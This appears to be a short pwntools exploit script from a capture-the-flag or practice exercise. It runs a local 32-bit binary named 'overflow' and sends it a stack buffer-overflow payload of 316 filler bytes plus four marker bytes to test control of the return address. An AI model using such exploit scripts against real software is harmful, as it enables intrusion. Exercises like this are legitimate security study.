from pwn import *
context(os='linux', arch='i386')
proc = process('./overflow')
out = proc.read()
print(out)
pause()

payload = b'A'*316
payload += b'B'*4
proc.writeline(payload)
out = proc.read()
print(out)